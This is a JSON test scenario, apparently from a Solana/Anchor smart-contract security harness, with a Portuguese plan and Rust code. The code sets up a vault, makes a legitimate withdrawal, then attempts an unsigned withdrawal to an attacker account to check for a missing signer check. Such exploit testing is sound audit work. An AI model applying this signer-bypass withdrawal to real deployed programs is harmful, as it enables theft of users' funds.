{
  "plan": "Inicializa o vault com a autoridade legítima e deposita lamports para que o vault tenha saldo. O baseline usa withdraw legítimo com a autoridade assinando. O ataque repete o withdraw com a mesma autoridade, mas sem assinatura, e um recipient controlado pelo atacante. O efeito mede se os lamports do vault diminuíram e os do recipient aumentaram sem a assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Contas iniciais
let authority_account = wallet(10_000_000_000);
let attacker_account = wallet(1_000_000_000);
let vault_account = empty_account();
let system_program = system_program_account();

// Inicializa o vault
let ix_init = env.anchor_ix("initialize", &(), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_init = vec![
    (vault_pda, vault_account.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_init = env.baseline("initialize vault", &ix_init, &accounts_init);

// Deposita lamports no vault
let deposit_amount = 5_000_000_000u64;
let ix_deposit = env.anchor_ix("deposit", &deposit_amount, &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program.0, false),
]);
let accounts_deposit = vec![
    (vault_pda, after(&r_init, &vault_pda).clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let r_deposit = env.baseline("deposit into vault", &ix_deposit, &accounts_deposit);

// Baseline: withdraw legítimo com autoridade assinando
let withdraw_amount = 1_000_000_000u64;
let ix_withdraw_legit = env.anchor_ix("withdraw", &withdraw_amount, &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(attacker, false),
]);
let accounts_withdraw_legit = vec![
    (vault_pda, after(&r_deposit, &vault_pda).clone()),
    (authority, authority_account.clone()),
    (attacker, attacker_account.clone()),
];
let r_legit = env.baseline("legitimate withdraw", &ix_withdraw_legit, &accounts_withdraw_legit);

// Ataque: withdraw sem assinatura da autoridade
let ix_attack = env.anchor_ix("withdraw", &withdraw_amount, &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, false), // sem signer
    AccountMeta::new(attacker, false),
]);
let accounts_attack = vec![
    (vault_pda, after(&r_legit, &vault_pda).clone()),
    (authority, authority_account.clone()),
    (attacker, attacker_account.clone()),
];
let r_attack = env.attack("withdraw without authority signature", &ix_attack, &accounts_attack);

if r_attack.program_result == ProgramResult::Success {
    let vault_after = after(&r_attack, &vault_pda);
    let attacker_after = after(&r_attack, &attacker);
    let vault_lamports_before = after(&r_legit, &vault_pda).lamports();
    let attacker_lamports_before = attacker_account.lamports();
    env.effect("vault lamports decreased without authority signature", vault_after.lamports() < vault_lamports_before);
    env.effect("attacker lamports increased without authority signature", attacker_after.lamports() > attacker_lamports_before);
}"
}

